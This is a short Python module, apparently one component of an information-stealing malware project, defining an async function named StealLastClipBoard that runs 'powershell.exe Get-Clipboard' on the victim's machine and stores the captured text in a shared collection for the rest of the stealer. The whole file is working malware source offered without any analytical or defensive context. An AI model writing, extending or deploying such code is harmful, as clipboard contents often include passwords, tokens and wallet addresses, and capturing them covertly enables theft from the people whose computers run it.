from main import ListFonction, error_handler
from computer import get_commands


async def StealLastClipBoard() -> None:
    try:
        output = await get_commands("powershell.exe Get-Clipboard")
        if output:
            ListFonction.ClipBoard.append(output)
    except Exception as e:
        error_handler(f"clipboard error - {str(e)}")
